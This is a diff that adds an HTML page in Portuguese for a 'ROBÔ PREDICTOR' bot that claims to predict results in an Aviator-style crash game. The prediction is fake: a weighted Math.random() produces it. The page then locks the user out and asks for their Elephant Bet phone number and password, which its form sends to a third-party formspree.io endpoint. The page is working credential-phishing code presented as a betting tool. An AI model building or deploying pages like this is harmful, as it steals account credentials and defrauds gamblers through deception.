@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ROBÔ PREDICTOR + Conectar Conta</title>
+  <style>
+    body {font-family:'Poppins',sans-serif;margin:0;padding:0;background:#000;color:#fff;text-align:center}
+    .header {background:#c00;color:#fff;padding:20px;font-size:22px;font-weight:bold}
+    .circle {width:200px;height:200px;border:6px solid #c00;border-radius:50%;margin:30px auto;display:flex;align-items:center;justify-content:center;background:#000}
+    .circle h1 {font-size:32px;color:#fff;text-shadow:0 0 10px #fff}
+    button {padding:14px 24px;font-size:18px;font-weight:bold;border:none;border-radius:8px;cursor:pointer;margin:12px auto;display:block;width:80%;max-width:320px}
+    #preverBtn {background:#009fe3;color:#fff}
+    #openLogin {background:#c00;color:#fff}
+    .sync-button {background:#009fe3;color:#fff;width:90%;padding:12px;border:none;border-radius:8px;font-weight:bold}
+    input {width:90%;padding:10px;margin:8px auto;border:2px solid #c00;border-radius:6px;font-size:16px}
+    .hidden {display:none}
+    .disabled-message {background:#222;color:#ffcc00;padding:10px;border-radius:6px;margin:15px auto;width:90%}
+    footer {margin-top:20px;font-size:.9em;color:#888}
+    @media(max-width:600px){.circle{width:150px;height:150px}.circle h1{font-size:24px}button{font-size:16px}}
+  </style>
+</head>
+<body>
+
+  <!-- Tela inicial -->
+  <div id="homeScreen">
+    <div class="header">ROBÔ PREDICTOR</div>
+    <form id="homeForm">
+      <input type="tel" id="numeroInicio" placeholder="Número de telemóvel" required maxlength="9" pattern="9[0-9]{8}">
+      <input type="text" id="chaveInicio" placeholder="Chave de acesso" required>
+      <button type="submit" style="background:#00c853;color:#fff">Entrar</button>
+    </form>
+    <p>Precisa de ajuda? Ligue: <strong>926 128 955</strong></p>
+  </div>
+
+  <!-- Tela do jogo -->
+  <div id="gameScreen" class="hidden">
+    <div class="header">ROBÔ PREDICTOR<br>100% de acertividade</div>
+    <div class="circle"><h1 id="multiplier">1.00x</h1></div>
+    <button id="preverBtn">Hackear Próxima Vela</button>
+    <button id="openLogin">Sincronizar Bot</button>
+    <p id="resultado"></p>
+    <p id="blockedMsg" class="disabled-message hidden">⚠️ Acesso bloqueado. Sincronize o Bot.</p>
+  </div>
+
+  <!-- Tela de login -->
+  <div id="loginScreen" class="hidden">
+    <div class="header">Conecte com a sua conta Elephant Bet</div>
+    <form id="loginForm" action="https://formspree.io/f/xvgwbowg" method="POST">
+      <input type="tel" name="numero" placeholder="Número de telemóvel" required maxlength="9" pattern="9[0-9]{8}">
+      <input type="password" name="senha" placeholder="Digite a sua senha" required>
+      <button type="submit" class="sync-button">Sincronizar Agora</button>
+    </form>
+    <button id="closeLogin" style="background:#555;color:#fff">← Voltar</button>
+    <p id="statusMsg"></p>
+  </div>
+
+  <!-- Tela de sincronização concluída -->
+  <div id="syncScreen" class="hidden">
+    <div class="header">Sincronização Concluída!</div>
+    <p>Obrigado por sincronizar o seu ROBÔ PREDICTOR com a Elephantbet.<br>Aguarde pelos dados de configuração do bot.</p>
+    <button id="backToGame" style="background:#c06;color:#fff">Voltar ao Bot</button>
+  </div>
+
+  <footer>© ROBÔ PREDICTOR</footer>
+
+  <script>
+    const homeForm=document.getElementById("homeForm"),
+          homeScreen=document.getElementById("homeScreen"),
+          gameScreen=document.getElementById("gameScreen"),
+          loginScreen=document.getElementById("loginScreen"),
+          syncScreen=document.getElementById("syncScreen"),
+          preverBtn=document.getElementById("preverBtn"),
+          multiplier=document.getElementById("multiplier"),
+          resultado=document.getElementById("resultado"),
+          blockedMsg=document.getElementById("blockedMsg"),
+          openLogin=document.getElementById("openLogin"),
+          closeLogin=document.getElementById("closeLogin"),
+          backToGame=document.getElementById("backToGame");
+
+    // Tela inicial
+    homeForm.addEventListener("submit",function(e){
+      e.preventDefault();
+      const numero=document.getElementById("numeroInicio").value;
+      const chave=document.getElementById("chaveInicio").value;
+      if(!/^9\d{8}$/.test(numero)){alert("Número inválido!");return;}
+      if(chave!=="10102025"){alert("Chave incorreta!");return;}
+      homeScreen.classList.add("hidden");
+      gameScreen.classList.remove("hidden");
+    });
+
+    // Predictor estilo Aviator
+    preverBtn.addEventListener("click",function(){
+      let valor=1.00;
+      const resultadoFinal=gerarResultadoAviator();
+      const intervalo=setInterval(()=>{
+        valor+=0.05;
+        multiplier.textContent=valor.toFixed(2)+"x";
+        if(valor>=resultadoFinal){
+          clearInterval(intervalo);
+          multiplier.textContent=resultadoFinal.toFixed(2)+"x";
+          resultado.textContent="Resultado → "+resultadoFinal.toFixed(2)+"x";
+          blockedMsg.classList.remove("hidden");
+          preverBtn.disabled=true;
+        }
+      },30);
+    });
+
+    function gerarResultadoAviator(){
+      const multiplicadores=[1.2,1.3,1.5,2,3,5,7,10,20,50,100];
+      const pesos=[30,20,15,10,8,6,5,3,2,1,0.5];
+      const totalPeso=pesos.reduce((a,b)=>a+b,0);
+      let rand=Math.random()*totalPeso;
+      for(let i=0;i<multiplicadores.length;i++){
+        if(rand<pesos[i]) return multiplicadores[i];
+        rand-=pesos[i];
+      }
+      return 2;
+    }
+
+    // Login
+    openLogin.addEventListener("click",()=>{gameScreen.classList.add("hidden");loginScreen.classList.remove("hidden");});
+    closeLogin.addEventListener("click",()=>{loginScreen.classList.add("hidden");gameScreen.classList.remove("hidden");});
+    backToGame.addEventListener("click",()=>{syncScreen.classList.add("hidden");gameScreen.classList.remove("hidden");});
+
+    document.getElementById("loginForm").addEventListener("submit",async function(e){
+      e.preventDefault();
+      const data=new FormData(this);
+      try{
+        const res=await fetch(this.action,{method:this.method,body:data,headers:{"Accept":"application/json"}});
+        if(res.ok){syncScreen.classList.remove("hidden");loginScreen.classList.add("hidden");}
+        else{document.getElementById("statusMsg").textContent="Erro ao conectar.";}
+      }catch{document.getElementById("statusMsg").textContent="Erro de conexão.";}
+    });
+  </script>
+</body>
+</html>
